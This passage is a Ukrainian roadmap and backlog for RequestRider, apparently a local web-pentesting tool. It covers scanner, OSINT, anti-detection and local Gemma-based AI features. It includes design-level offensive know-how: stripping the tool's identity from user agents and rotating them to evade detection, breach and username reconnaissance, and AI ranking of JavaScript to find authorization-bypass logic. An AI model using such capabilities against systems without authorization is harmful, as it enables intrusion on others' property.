# Roadmap RequestRider

## Статус roadmap та архітектурне позиціонування

> **Архітектурне позиціонування:** Request-Rider є **автономним локальним інструментом тестувальника/пентестера** для роботи безпосередньо на робочій станції (single-user local security tool). Застосунок не є SaaS/хмарним багатокористувацьким сервісом і не потребує складних multi-tenant ізоляцій, розподілених кластерів або зовнішніх важких СУБД.
> **Головні інженерні пріоритети:** максимальна локальна швидкодія (Zero-lag UI), ощадне споживання пам'яті (RAM) та CPU на машині тестувальника, швидкість обробки великих масивів трафіку/пейлоадів та надійність локального браузерного флоту.

Цей файл містить лише невиконаний backlog (`[ ]`). Виконані пункти видалено
для читабельності; історія виконаних робіт зберігається в
`DEVELOPMENT_LOG.md`. Кожен пункт backlog вважається нереалізованим до повного
проходження targeted/regression тестів і browser smoke-test.

Під кожним пунктом курсивом додано коротке пояснення запланованої фічі.

## Перевірено та вилучено з backlog (оновлено 2026-10-28)

Розбір backlog проведено по коду, а не за текстом: кожен знятий пункт має
доказ (файл, рядок або команда). Список наведено тут, щоб наступна сесія не
витрачала час на повторну перевірку.

| Знятий пункт | Доказ реалізації |
|---|---|
| **Детекція бізнес-логіки та BOLA/IDOR (`BusinessLogic`)** (знято 2026-10-28) | `engine/pkg/active/detect_business_logic.go`, юніт-тести `engine/pkg/active/detect_business_logic_test.go`, реєстрація у `scan.go` |
| **SPA discovery клієнтських маршрутів та Candidate Points** (знято 2026-10-28) | `engine/pkg/active/scan_crawl.go` (парсинг script src та витяг API-маршрутів), `engine/pkg/active/points.go` (`CandidatePointsForURL`), тести `points_test.go` |
| **Роздільні меню експорту Active Scan та Corpus Checks** (знято 2026-10-28) | `web/templates/lab/tabs/_scanner.html` (`data-export-menu="active"` та `data-export-menu="corpus"`), обробники експорту `_active_scanner_logic.html` (JSON, HTML, CSV) |
| **Аналіз JavaScript Source Maps v3 та AST у Target** (знято 2026-10-26) | `engine/target_sourcemap.go`, `engine/target_sourcemap_test.go` (8 тестів PASS), виявлення чутливих файлів, нормалізація шляхів та видобуток ендпоінтів |
| **Класифікація секретів та облікових даних** (знято 2026-10-28) | `engine/pkg/enrich/secrets_project_rules.go`, розділення credentials, passwords, hashes, email/accounts, тести `secrets_project_rules_test.go` |
| Поведінкові профілі сканера з окремими бюджетами + `wappalyzergo` | `engine/go.mod:13`, `engine/main.go:2440-2444` (`wappalyzerClient`), `web/lab/views.py:3840,6198` (`profile` у payload/params) |
| Stable evidence-aware identity знахідок та ідемпотентний upsert | `web/lab/models.py:323` `compute_finding_identity`, `web/lab/models.py:387-409` `ScannerRun.upsert_findings`; виклики `web/lab/active_scanner_views.py:337-400`, `web/lab/agent_tools.py:380-420` |
| Email/username recon, paste/breach lookup, GHDB link generator, GitHub public metadata | `engine/osint_transforms.go:112` `email_recon`, `:121` `username_search`, `:127` `ghdb_links`, `:160` `breach_exposure`, `:1430` сутність `username` із provenance `github_public_api` |
| Повні DNS-записи A/AAAA/CNAME/MX/NS/TXT/SOA/CAA + wildcard detection | `engine/osint_transforms.go:2040-2090` (A/AAAA, CNAME, MX, NS, TXT, SOA, CAA з explicit errors), `:3520` `detectWildcardDNS` + `:4569` окремий probe |
| Host affinity `ProxyPool.endpoint_for(url)` у browser-worker | `browser-worker/proxy_pool.py`, виклик у crawl_worker |
| Керована конкурентність у DNS/bucket брутфорсі та Repeater Burst | `engine/osint_transforms.go:4611-4624` (`bruteForceSubdomains`, worker queue), `:921-947` (`checkBucketCandidates`), `engine/burst.go:148-160` (батчі по `Concurrency` + `WaitGroup`) |
| Версіоновані налаштування `uiPreferences` | `web/templates/lab/index.html:13711` `migrateUIPreferences`, snapshot/валідація |
| Semantic status/tag tokens, accessible progress, toast service | токени в `:root`, `.scanner-progress-*` (з `percent == -1`), `.toast` з `toast-success|warning|error` |
| Right-click/keyboard контекстне меню рядка | `web/templates/lab/index.html:2196` `#ctx-menu role="menu"`, openRowMenu, делегування по `data-ctx-*` |
| H2 single-packet як manual-only експеримент | `engine/last_byte.go:399-401` — весь HTTP/2 burst пишеться одним user-space буфером; детермінованого one-packet delivery не заявляється |
| Registry node-екзекуторів workflow | `web/lab/workflow_engine.py:1223-1236` `node_executors`, `:1632` resolve за типом |
| Брокерна оркестрація і durable checkpoint вузлів | `web/lab/engine_broker.py:94` `EngineTaskDeferred`, `:210` відкладення, `:308-333` idempotent-відновлення за checkpoint; `web/lab/workflow_engine.py:1965-2008` `_recover_interrupted` |
| Вихідні webhook-сповіщення на workflow-тригери | `web/lab/workflow_engine.py:64,196` тип вузла `webhook_trigger`, `ALL /api/workflows/hooks/<slug>` |
| ~~Target: вікно з двома рівними запитами (клік по рядку / пункт у kebab `⋯`)~~ | **Знято рішенням оператора 2026-10-16**, до реалізації не дійшло. Готовий тригер при цьому лишається валідним для майбутніх правок: пункт у kebab `⋯` / right-click меню `#ctx-menu` для таблиці Target вже існує |
| **N5. Пауза і продовження для активного сканера та краулера Target** (знято 2026-10-22) | `engine/pkg/runstate/` (`Gate`, `ErrPaused`), `engine/scanner_active.go` (`POST /api/scanner/active/<id>/control action=pause|resume`), `engine/main.go:3018` (`POST /api/target/map/<id>/control action=pause|resume`), тести `engine/scanner_active_pause_test.go`, `engine/target_map_pause_test.go` |
| **N6. Переотправка невідправлених запитів + детектор обриву** (знято 2026-10-22) | `engine/pkg/runstate/` (`Ledger`, `ClassifyTransportError`, `Streak`, `DefaultFailurePause = 20`), автоматична зупинка на стрику відмов, `POST /api/scanner/active/<id>/resend`, тести `TestTheAutomaticPauseFiresOnAStreakOfTransportFailures`, `TestResendReissuesOnlyTheRequestsThatNeverAnswered` |
| **N7. Збереження стану і прогресу з відновленням фронтиру** (знято 2026-10-22) | `runstate.Checkpoint` у `ActiveScanJob` та `TargetJob`, серіалізація фронтиру, звіт причин відмов, відновлення з checkpoint без втрати черги у `engine/scanner_active.go` та `engine/main.go` |
| **N3. Антидект у кожному інструменті та прибирання `RequestRider-*` з UA** (знято 2026-10-22) | Ротація `RandomUserAgent()` у `UserAgent.txt` для всіх інструментів: `engine/user_agents.go`, `engine/pkg/active/user_agents.go`, `engine/pkg/scanner/user_agents.go`, `engine/anti_detect.go`, `engine/main.go` (route-check, scanner, osint). Вилучено `RequestRider` із UA. Тести `corpus_user_agent_test.go`, `osint_archive_test.go`, `anti_detect_test.go` |
| **N8. Zero-lag Navigation & Модульний розпил `index.html`** (знято 2026-10-22) | `web/templates/lab/tabs/` (`_projects.html`, `_proxy.html`, `_repeater.html`, `_intruder.html`, `_target.html`, `_osint.html`, `_scanner.html`, `_comparer.html`, `_decoder.html`, `_ai.html`, `_automation.html`, `_history.html`, `_traffic.html`); `content-visibility: hidden` для `.tab`, коалесценція `pendingWorkspaceRestoreFrame` з `cancelAnimationFrame`, `requestAnimationFrame` для `applyOverlayEdges`, безпечний debounce 600мс з `requestIdleCallback` для `persistWorkspaces`; регресійні тести `lab.test_api_contract` (57/57 OK) |
| **N2. Шестерня налаштувань у вкладках (Tab Settings Gear)** (знято 2026-10-26) | `uiPreferences v2` схема з міграцією, CSS custom properties теми (Default, Burp, Cyberpunk, Monokai, High Contrast), кастомний DNS & DoH, інлайн-перейменування табів (двоклік/F2), уніфікований діалог `_tab_settings_dialog.html`, Command Palette `Ctrl+K`, повна UA/EN локалізація, тести `test_tab_settings` (64/64 OK), browser E2E smoke test (0 помилок) |
| ~~Shared action registry та розширені shortcut profiles~~ | **Знято рішенням оператора 2026-10-26**, окремий Action Registry визнано надлишковим: базової Command Palette `Ctrl+K` та прив'язки дій у `#ctx-menu` достатньо |

**Виправлення суперечностей у самому файлі (2026-10-16).**

- Раніше блок «P1. OSINT Entity Graph» стверджував, що canvas реалізовано на
  **React Flow**. Виміряно: `grep -c reactflow web/templates/lab/index.html` → **0**,
  вендореного бандлу React Flow у `web/static/vendor/` немає. Підключено
  **Cytoscape.js 3.33.1** (`:3237` `<script src="/static/vendor/cytoscape-3.33.1.min.js" nonce>`,
  `:16143` і `:16803` ініціалізація canvas OSINT-графа). React Flow, Cytoscape для
  Automation і Monaco Editor **не підключені**; Automation canvas — власний.
- Раніше «Перевірений стан проєкту» стверджував, що React Flow/Cytoscape/Monaco
  «не підключені». Cytoscape підключено, решта — ні.

## Automation / Workflows

Поточний runtime є process-local і оптимізований для локального запуску на хості.
Брокерна частина працює через локальний Redis, Celery publisher, Go consumer і Django
result persistence.

### Наступні ітерації

- [ ] Додати server-backed `WorkflowTemplate` CRUD, community manifests,
      schema signing та import preview.

  > Пояснення: планується серверне сховище шаблонів workflows з підписом схем і попереднім переглядом імпорту, замість лише локального каталогу. Моделі `WorkflowTemplate` у `web/lab/models.py` немає.

- [ ] Додати Nuclei/Postman converters лише після canonical graph validation.

  > Пояснення: планується конвертація Nuclei/Postman у канонічний граф RequestRider, але тільки після готової серверної валідації графа. Наразі нормалізація є лише для n8n-стилю (`web/lab/workflow_engine.py:526-575`).

## Session/workspace

<!-- Project isolation та versioned uiPreferences завершено / знято рішенням оператора -->

## Accessibility

<!-- Окремих невиконаних пунктів немає: точки перевірки a11y вбудовані в кожен пункт
     backlog (focus-visible, aria-pressed/haspopup, контраст токенів). -->

## Scanner та Findings

<!-- Обидва пункти цього розділу реалізовано 2026-10-16 перевіркою коду —
     див. таблицю «Перевірено та вилучено з backlog». Пункт про поведінкові профілі
     закритий `wappalyzergo` + бюджетами зондувань, пункт про stable identity —
     `compute_finding_identity` / `upsert_findings`. -->

## Нові пункти (2026-10-22, оновлено 2026-10-28 під покоління EmbeddingGemma 2 та Gemma 4)

### N1. Дворівнева локальна AI-архітектура: EmbeddingGemma 2 (Tier 1 Sensor) + Gemma 4 E2B/E4B (Tier 2 Operator)

- [ ] Інтегрувати **EmbeddingGemma 2** (на архітектурі Gemma 4, Apache 2.0, модульне ядро **270M Text & Code** / **440M Text+Vision**, контекст **8 192 токени**) як надлегкий локальний он-деманд сенсор ембеддингів у парі з компактними генеративними моделями **Gemma 4 (`gemma4:e2b` / `gemma4:e4b`)** як локальним ReAct-оператором — без зовнішнього API-ключа, без CDN і з нульовим споживанням RAM у режимі простою.

  > Пояснення: порівняно з першою версією `EmbeddingGemma` (308M, контекст лише 2K токенів), **EmbeddingGemma 2** має менше текстово-кодове ядро (**270M параметрів**, ~160–220 MB RAM у Q4/Q8), але **вчетверо більше вікно контексту (8 192 токени)**, що дозволяє подавати на вхід повні HTTP-відповіді (4–15 КБ HTML/JSON) та цілі функції з JS-бандлів без обрізання. Підтримує Matryoshka Representation Learning (MRL) зі зрізанням вектора з 768 до **512 / 256 / 128 координат**. Локальний запуск через Ollama (`ollama pull embeddinggemma-2`, `POST http://127.0.0.1:11434/api/embed`, `keep_alive: "60s"`) або вбудований `llama.cpp` воркер.

  #### Порівняльна таблиця локального AI-стеку покоління Gemma 4

  | Характеристика | EmbeddingGemma (v1, застаріла) | **EmbeddingGemma 2 (Tier 1 Сенсор)** | **Gemma 4 `e2b` / `e4b` (Tier 2 Оператор)** |
  |---|---|---|---|
  | **Призначення в Request-Rider** | Текстові ембеддинги | **Пакетна фільтрація аномалій, індексація коду/скілів та візуальний тріаж** | **ReAct-цикл (`agent_loop.py`), деобфускація JS, виклик MCP-інструментів** |
  | **Активні параметри** | 308M | **270M** (Text/Code) або **440M** (Text+Vision) | **~2B (`gemma4:e2b`)** / **~4B (`gemma4:e4b`)** |
  | **Контекстне вікно** | 2 048 токенів | **8 192 токени** (повний HTTP-обмін або JS-чанк) | **32K – 128K+ токенів** |
  | **Споживання RAM (Q4/Q8)** | ~200 MB | **~160–220 MB** (0 MB у простої при `keep_alive: 60s`) | **~1.3 GB (`e2b`)** / **~2.6 GB (`e4b`)** |
  | **Швидкість на CPU (без GPU)** | ~15–25 мс / запит | **~8–15 мс / запит** (батч 50–100 відповідей за 1 виклик) | **25–45 tok/s (`e2b`)** |

  #### Шість цільових точок інтеграції у кодову базу Request-Rider

  1. **Intruder Outlier Detection & Active Scanner Clustering (`engine/pkg/active/`, `web/lab/`):**
     - Автоматичне виявлення семантичних аномалій у фазингу та активному скануванні. Перед векторизацією виконується легка нормалізація відповіді (`StripDynamicNoise` — очищення динамічних заголовків `Date`/`Set-Cookie`/`CF-Ray`, збереження статусу, структури ключів JSON та тіла помилки до 8K токенів).
     - Пакетне обчислення L2-нормалізованих MRL-векторів розмірності **128d / 256d** та розрахунок косинусної відстані до baseline-відповіді: $\text{AnomalyScore}(r_i) = 1 - (\hat{u}_{base} \cdot \hat{v}_i)$.
     - У `Intruder`: рядки з високим `AnomalyScore` (інший стектрейс, обхід авторизації, прихований витік полів при незмінному статусі `200 OK`) маркуються та піднімаються нагору таблиці.
     - В `Активному сканері`: автоматична кластеризація однотипних відповідей (наприклад, шаблонів блокування WAF при $\theta > 0.92$), що безпосередньо вирішує завдання кластеризації базових відповідей із розділу `P1`.
  2. **Семантичний маршрутизатор 546 скілів та динамічний фільтр інструментів (`web/lab/agent_loop.py`, `web/lab/agent_tools.py`):**
     - Попередня індексація описів усіх 546 інженерних скілів через `EmbeddingGemma 2` (256d `float16`) у компактний локальний файл `web/lab/data/skills_embeddings_256d.bin` (розмір усього **~280 КБ**).
     - При старті `run_agent_loop()` запит оператора та прикріплені докази за ~10 мс зіставляються з векторами скілів та схем інструментів (`TOOL_DEFINITIONS`): у контекст **Gemma 4 (`e2b`/`e4b`)** автоматично підкладаються топ-2 релевантні методології та лише **5–7 релевантних інструментів** замість усіх 29. Це усуває розмивання уваги малих моделей, економить кроки `DEFAULT_MAX_STEPS` і прискорює prefill на CPU в 3–4 рази.
  3. **Code-Aware JS AST & SourceMap Triage (`engine/target_sourcemap.go`, `engine/pkg/active/scan_crawl.go`):**
     - Оскільки 270M-ядро `EmbeddingGemma 2` нативно навчене на програмному коді, воно векторизує мініфіковані/обфусковані функції з клієнтських JS-бандлів (до 8K токенів на функцію чи модуль) і ранжує їх за близькістю до небезпечних патернів (*клієнтська перевірка ролей*, *генерація підписів API*, *небезпечні `postMessage`/`innerHTML` стоки*, *приховані адмін-маршрути*).
     - Обрані топ-кандидати передаються у локальну **Gemma 4 (`e4b`)** для пояснення логіки обходу українською мовою.
  4. **Візуальний та мультимодальний тріаж сторінок у `browser-worker` (440M Text+Vision режим):**
     - Опціональне використання Vision-енкодера `EmbeddingGemma 2` (440M) для перетворення скриншотів Playwright Firefox та DOM-заголовків обходу `Target` / `OSINT` у єдиний 256d векторний простір. Дозволяє миттєво групувати візуально однакові сторінки-заглушки (Soft-404, парковки, екрани блокування WAF) і виділяти унікальні інтерфейси (відкриті дашборди, панелі керування, форми авторизації).
  5. **Оновлення локальних пресетів провайдера (`web/lab/agent_services.py`, `_tab_settings_dialog.html`):**
     - Заміна важкого дефолту `llama3.1` у `PROVIDER_PRESETS["ollama"]` на три адаптивні локальні профілі в налаштуваннях вкладки `AI Assistant`:
       - **Ultra-Light (CPU Only):** `gemma4:e2b` + `embeddinggemma-2` (128d, Text/Code) — пікове споживання **~1.5 GB RAM**;
       - **Balanced Security Pro:** `gemma4:e4b` + `embeddinggemma-2` (256d, Text/Code) — пікове споживання **~2.8 GB RAM**;
       - **Multimodal Recon:** `gemma4:e4b` / `gemma4:12b` + `embeddinggemma-2` (256d, 440M Text+Vision).
     - Передача детермінованого `"format": "json"` для консультативного режиму в `OpenAICompatibleProvider.chat()`, щоб гарантувати безпомилковий парсинг у `_extract_chat_json()`.
  6. **Надлегке зберігання векторів без залежності від `pgvector` (`web/lab/models.py`):**
     - Зберігання зрізаних MRL-векторів (128d або 256d у форматі `float16` / `int8` — всього **256–512 байтів на запис**) у стандартному полі `BinaryField` (`bytea` у PostgreSQL).
     - Повний перебір 10 000 векторів займає лише ~5 МБ оперативної пам'яті та виконується в Go або Python менш ніж за **2 мс** без жодних зовнішніх C-розширень СУБД.

  **Відкинуто як неефективне:**
  - Семантичний пошук по всій сирій історії `History`/`Traffic`: у реальному пентесті пошук ведеться за точними детермінованими полями (статус, метод, хост, підрядок/regex), де індекси PostgreSQL та `ILIKE` працюють швидше і без витрат RAM.

### N4. Бойова верифікація нашого MCP-сервера на локальних моделях Gemma 4 (`gemma4:e2b` / `gemma4:e4b`) через Ollama

- [ ] Прогнати `request-rider-mcp/server.py` з **локальними моделями `gemma4:e2b` та `gemma4:e4b`** (а також `qwen3` для порівняння) в ролі мозку агента через реальний stdio JSON-RPC протокол і зафіксувати вимірюваний результат.

  > Пояснення: MCP-інструменти вже проганялися прямими HTTP-викликами без LLM (`/tmp/opencode/agent-combat-mcp4.py`, 11/11 завдань). Тепер необхідно перевірити реальний ланцюжок: семантичний відбір інструментів через `embeddinggemma-2` → локальна модель `gemma4:e2b` / `gemma4:e4b` → stdio JSON-RPC `request-rider-mcp/server.py`.

  **Обсяг (що саме перевіряється):**
  - підняти локальний Ollama без системного сервісу (тимчасовий каталог, `OLLAMA_HOST=127.0.0.1`), завантажити `embeddinggemma-2` та `gemma4:e2b` / `gemma4:e4b`;
  - підключитися до `request-rider-mcp/server.py` **реальним MCP-клієнтом** через stdio (JSON-RPC), а не HTTP-шимом;
  - прогнати ReAct-цикл «модель → `tools/list` (з фільтрацією топ-інструментів та скілів через `embeddinggemma-2`) → виклики інструментів → підсумок» на завданнях бойового прогону (project list/switch, history read, raw send, target crawl, OOB, scanner);
  - стенд — **ізольований** за правилом ізольованого середовища: окремий checkout, окремі `POSTGRES_DB` і `data/`, власні порти (`RR_GATEWAY_URL`, `RR_ENGINE_URL`, `RR_WORKER_URL`), жодного `pkill` за шаблоном імені.

  **Артефакт і приймання:** у репозиторії лишається порівняльна таблиця вимірів для `gemma4:e2b` та `gemma4:e4b` (% завершених завдань, кроків на завдання, швидкість prefill/eval на CPU, споживання RAM, помилки формату відповіді) і транскрипт повного циклу; стенд, Ollama та браузери гасяться **по записаним PID**.

  **Побічний дефект, який закривається тут:** `request-rider-mcp/README.md` заявляє, що сервер потребує лише стандартної бібліотеки (`json`, `sys`, `os`, `urllib`, `base64`, `ssl`), але `server.py` імпортує `mcp.server.mcpserver` і `httpx` (і це підтверджено `requirements.txt`). Документація й код мають описувати одну реальність.

## Стратегічний backlog, узгоджений 2026-09-24

Цей backlog виникає з аудиту поточного коду, а не з припущень про наявність
функцій. Він виконується залежно від security/data foundation; один пункт за
раз проходить targeted tests, regression suite та live browser smoke-test.

### P1. OSINT Entity Graph та local transforms

<!-- Email/username recon (`email_recon`, `username_search`), breach-lookup
     (`breach_exposure`), GHDB link generator (`ghdb_links`) і GitHub public
     metadata реалізовані — див. таблицю «Перевірено та вилучено з backlog».
     DNS-записи A/AAAA/CNAME/MX/NS/TXT/SOA/CAA з explicit errors і wildcard
     DNS detection реалізовано в Go Engine. -->

Canvas OSINT-графа реалізовано на **Cytoscape.js 3.33.1** — локально
вендорений бандл `web/static/vendor/cytoscape-3.33.1.min.js`, без CDN і зовнішніх
fetch. Bounded 1000-node budget, keyboard-accessible DOM-вузли та відсутність
color-only значень збережені. **React Flow не підключено**, і підключення
Canvas Automation залишається окремим backlog-пунктом (див. Фаза 6.3).

**Референси архітектури:** [Argus](https://github.com/cotcollective/argus) (MIT,
local-first modules), [Flowsint](https://github.com/reconurge/flowsint)
(Apache-2.0, graph/enricher ideas), [Osiris](https://github.com/simplifaisoul/osiris)
(MIT, live activity/UI ideas). Argus не робить запити приватними: локальним є
виконання, але public endpoints/websites всё одно бачать запит. Код сторонніх
проєктів не копіювати без окремого license/NOTICE audit.

### P1. OSINT → Scanner pipeline

- [ ] Додати data-only scanner template schema до YAML preview. Виняток,
      sanctioned 2026-09-25 власником: дозволено обмежене HTTP-only виконання
      Nuclei-подібних шаблонів (request + matchers status/words/regex, без коду
      і shell); див. `engine/pkg/scanner` і `DEVELOPMENT_LOG.md`.

  > Пояснення: планується data-only схема шаблонів сканера без коду і shell; виняток — обмежене HTTP-виконання Nuclei-подібних matchers за ENV-бюджетами. Термін «data-only» у коді відсутній (`grep -rn "data-only" engine/pkg/scanner → 0`).

- [ ] Додати **clustering-based** context-aware mutations та adaptive
      429/503 backoff у активний сканер.

  > Пояснення: кластеризація базових відповідей і мутації залежно від кластера
  > ще не реалізовані (`grep -rn "cluster" engine/pkg/active → 0`,
  > `grep -rn "Retry-After" engine/pkg/active → 0`). Bounded OAST уже є
  > (`engine/pkg/active/detect_out_of_band.go`), browser-rendered evidence теж
  > (`engine/pkg/active/browser.go`), тому лишилися саме кластеризація і backoff.

### P1. Automation, SessionMacro та API security

- [ ] Додати AttackChain/AttackStep/evidence provenance після stable IDs;
      не перевикористовувати execution DAG як semantic security graph.

  > Пояснення: планується семантичний граф ланцюжка атаки з provenance evidence, окремо від технічного DAG виконання. Моделі `AttackChain`/`AttackStep` у `web/lab/models.py` немає.

### P1. Protocols, client-side та API security

- [ ] Додати protocol metadata і local H2 fixture/TLS tests до WebSocket,
      gRPC/Protobuf, H3/QUIC та frame-level features.

  > Пояснення: планується метадані протоколів і локальні фікстури для WebSocket, gRPC, H3/QUIC з тестами TLS. Спеціального коду цих протоколів у `engine/` немає.

- [ ] Додати WebSocket capture/replay, gRPC `.proto`/`.desc` introspection і
      bounded binary mutations; raw bytes і metadata мають залишатися
      розрізнюваними.

  > Пояснення: планується захоплення і повтор WebSocket, інтроспекція gRPC-схем і обмежені бінарні мутації без змішування байтів і метаданих.

- [ ] Додати JavaScript source-map/AST analysis та local taint evidence;
      browser WebSocket events.

  > Пояснення: аналізу JS source-map/AST ще немає (`grep -rn "sourceMappingURL\|sourcemap" engine web/lab → 0`). Витягування секретів реалізоване (`engine/osint_secrets.go`, `engine/osint_secrets_scan.go`), тому воно з пункту зняте.

- [ ] Додати OpenAPI/Postman import, GraphQL introspection/schema inspection,
      BOLA role matrix і JWT allowlist/signature verification fixtures.

  > Пояснення: планується імпорт API-специфікацій, інтроспекція GraphQL, матриця BOLA-ролей і фікстури перевірки JWT. Рендеринг JWT у відповідях уже є (`web/templates/lab/index.html:1906-1909` `.http-jwt-*`), fixture-перевірка підпису — ні.

### P1. UI/UX та interaction primitives

- [ ] Додати в Repeater режими перегляду **Pretty / Raw**.

  > Пояснення: перемикач між відформатованим поданням (Pretty для JSON/XML/HTML) та сирим байтовим потоком (Raw) у відповіді Repeater. Режими Hex та visual diff знято за рішенням оператора як надлишкові для першої черги (для порівняння є вкладка Comparer).

- [ ] Додати OSINT graph/Findings Kanban, live activity bar та localization
      усіх dynamic states без color-only meaning.

  > Пояснення: планується Kanban для графа і findings зі стрічкою активності і повною локалізацією динамічних станів.

- [ ] Додати browser tests для layout persistence, keyboard operation,
      language switch, XSS/binary/malformed input, console та failed requests.

  > Пояснення: browser E2E-тестів UI в репозиторії немає: `grep -rln playwright web/lab/*.py → 0`, а `test_divider_never_covers_the_raw_block`, на який посилаються `README.md:583`, `AGENTS.md:1105` і `Документация/posibnyk-porystuvacha.md:580`, у коді відсутній. Пункт лишається відкритим доти, доки тест реально існуватиме.

### P2. Collaboration, integrations та CLI/CI

- [ ] Додати fixture-only CI для checks/tests/E2E/SARIF validation; CI не
      запускає зовнішні active targets без isolated explicit configuration.

  > Пояснення: планується CI лише на фікстурах без звернень до зовнішніх цілей, окрім явно ізольованої конфігурації. Каталогу `.github/` у репозиторії немає.

# План TODO для розвитку RequestRider

> **Цей файл містить лише невиконаний беклог.** Виконані пункти прибрано для
> читабельності; історія виконаних робіт — у `DEVELOPMENT_LOG.md`, правила
> проєкту — в `AGENTS.md`. Кожен пункт вважається нереалізованим до повного
> проходження targeted/regression-перевірок і, для browser-facing змін, живого
> browser smoke-test.

Робота виконується малими ітераціями: кожна зміна має окремі критерії приймання,
міграційний/зворотно-сумісний шлях і тести до переходу на наступний пункт.

## Мета й підхід

Побудувати поетапний, перевірюваний план модернізації інфраструктури,
Go/browser workers, REST та OSINT-інтеграцій і наявної Automation.

## Перевірений стан проєкту (переглянуто 2026-10-16)

- `docker-compose.yml` містить вісім сервісів: `tor`, `engine`,
  `browser-worker`, `web`, `celery`, `engine-results`, PostgreSQL і **Redis**.
  RabbitMQ прибрано 2026-09-27 рішенням власника: Redis — єдиний брокер engine
  task transport.
- Брокерний шлях перевірений наскрізно **живим прогоном**:
  (Django → Celery → Redis → Go → Redis → PostgreSQL), сценарії success,
  redelivery без повторної зовнішньої
  дії, error, restart recovery, cancel, malformed dead-letter.
- PostgreSQL — єдиний рушій; інших рушіїв у коді й документації немає. Тестова
  база створюється з UTF-8 шаблону, і `core.test_runner` створює сам
  відсутній шаблон, тож `python manage.py test` зелена на новому кластері.
- Workflow має `Workflow` / `WorkflowRun` / `WorkflowNodeExecution`, JSON-поля
  для вузлів і зв’язків, канонізацію графа, перевірку циклів, типізований
  condition, schedule/webhook/manual triggers, SSE, журнал вузлів,
  cancel/pause/resume, JSON/Markdown export і project bundle. Runtime і
  scheduler лишаються process-local: після перезапуску незавершені запуски
  переходять у `interrupted`, а безпечні межі відновлюються з checkpoint-ів.
- Брокерні вузли workflow dispatch-яться лише за
  `WORKFLOW_ENGINE_BROKER_ENABLED=1` (Repeater `request.execute`, static Target
  `target.crawl`); для решти типів вузлів HTTP-шлях лишається default.
- `browser-worker/worker.py` має process-level Playwright runtime із
  кешованими browser processes, окремий `BrowserContext` на job, блокування
  image/font/media через `page.route()` і гарантоване закриття контекстів.
- Automation UI має власний canvas, palette та inspector.
  **Фактичний стан бандлів (2026-10-16):** підключено лише **Cytoscape.js
  3.33.1** (OSINT Entity Graph, локальний бандл, без CDN); **React Flow** і
  **Monaco Editor** — дозволений стек, але **не підключені** (0 згадувань у
  `web/templates/lab/index.html`). Підключення кожного — окреме рішення власника
  з умовою локально вендореного бандлу.

## Узгоджені межі та архітектурні рішення

1. Дотримуватись `AGENTS.md`. Заборона стосується **політик щодо цілей**, а явні
   технічні межі (таймаути, керована конкурентність, квоти, межі пісочниці)
   дозволені за умови, що вони видимі, перекриваються явним введенням і не
   звужують можливостей інструменту.
2. PostgreSQL є єдиною базою даних; Docker Compose — альтернативний спосіб
   розгортання, а не обов’язковий залежність застосунку.
3. **Redis — єдиний брокер**, транспорт не обирається. Старий `amqp://` падає з
   помилкою, що називає заміну. Go engine не йде через kombu: той обгортає
   повідомлення власним envelope, тож Go залежав би від фреймінгу чужого проєкту.
   Celery лишається на kombu.
4. **Nuclei v3 SDK — відхилено 2026-09-27, лишається керований binary runner.**
   SDK не має pause/resume, а `ExecuteCallbackWithCtx` відкидає помилку
   `ExecuteScanWithOpts`, тобто втрачаються exit status, stdout і stderr.
   Це послабило б явність помилок. Production dependency не додано:
   `engine/go.mod` не містить `projectdiscovery/*`.
5. REST API планувати як DRF endpoint/serializer contract; вибір API
   автентифікації відкладено і не вважається готовим до зовнішнього доступу.
6. Neo4j лишається feasibility-рішенням після вимірювання; міграцію не планувати
   без доказу, що реляційне сховище є вузьким місцем.
7. Тригери нотифікацій прив’язувати до `ScannerRun.findings`: модель `Finding`
   видалена міграцією `0037_delete_finding.py`.
8. `Source of truth` — `web/lab/models.py`; міграція обов’язкова на кожну зміну
   моделі. Усі 16 моделей мають читачів/письменників; мертвих таблиць і колонок
   немає (перевірено 2026-09-28).
9. **Ідентифікація інструменту у трафіку — неявне рішення, яке треба переглянути**
   (2026-10-16). Пункт N3 скасовує попереднє рішення, зафіксоване в
   `engine/anti_detect.go`; до його реалізації документ і код мають описувати
   один стан, а не два.

## Детальний TODO

### Фаза 2. Go Engine

#### 2.1 Контрольована конкурентність

<!-- Виконано: worker pool у DNS- і bucket-брутфорсі та батчі Repeater Burst.
     Див. таблицю «Перевірено та вилучено з backlog». -->

#### 2.3 HTTP client та context

- Аудит pooling завершено 2026-09-27: transport створюється на кожне route
  generation у `engine/routing.go`, і HTTP handler-и передають йому
  `s.requestTransport()`. Один глобальний `http.Client` окремий pool не усуне,
  а глобальний `Transport` суперечив би route generation, passive proxy
  (`DisableKeepAlives: true`) і raw Last-Byte.
- Реалізувати `context.WithTimeout` у функціях, що роблять зовнішні запити без
  явного cancellation path (`engine/osint_transforms.go`, archive-індекси,
  `engine/last_byte.go` за наявними полями). Кожен deadline — з явного поля
  запиту або задокументованого default, перекритий користувачем і видимий у
  статусі. **Виміряно 2026-10-16:** `grep -c "WithTimeout" engine/osint_transforms.go` → **0**,
  тож пункт лишається відкритим.
- Зберегти route/proxy/TLS/cancel поведінку; не вводити прихованих
  timeout/concurrency defaults. Додати regression-тести на відсутність витоку
  горутин.

**Приймання:** спільний transport не ламає route/proxy/TLS/cancel поведінку;
жодна зовнішня функція не лишається без cancellation path.

### Фаза 3. Browser Worker

#### 3.1 Привʼязка хоста до ендпоинта пула

<!-- Виконано: ProxyPool.endpoint_for реалізовано та інтегровано в crawl_worker -->

### Фаза 4. REST API та OSINT

#### 4.1 DRF API

- Підключити Django REST Framework і написати serializers/views для
  `ScannerRun`, workflow запуску та результатів, з перевіркою project context і
  стабільною формою помилок.
- Зберегти чинні JSON endpoints і session/CSRF-поведінку browser UI; визначити
  версіонування API та тести сумісності.
- Автентифікацію Token/JWT відкладено. Не вважати API готовим до зовнішнього
  доступу до вибору auth, перевірок авторизації та явного погодження exposure
  model.

**Приймання:** serializers/endpoints мають schema, validation, permissions tests
і не змінюють поточні API-контракти.

#### 4.2 OSINT enrichment

- Звірити `engine/osint_collector.go`, `web/lab/models.py` та поточний OSINT
  graph ingestion/upsert contract.
- Реалізувати provider interface для Shodan/Censys/VirusTotal; конкретні
  provider-и та необхідні поля/квоти погодити перед підключенням. **Виміряно
  2026-10-16:** жодного з цих провайдерів у коді немає — єдині збіги `shodan`
  трапляються лише в регулярках секретів (`engine/pkg/enrich/secrets_data.go`).
- Зберігати API credentials поза кодом і log-ами; описати opt-in, provider
  errors, duplicate/idempotent observations і provenance (provider, observed
  time, entity relation).
- Публікувати enrichment tasks через брокер; приймати та атомарно зберігати
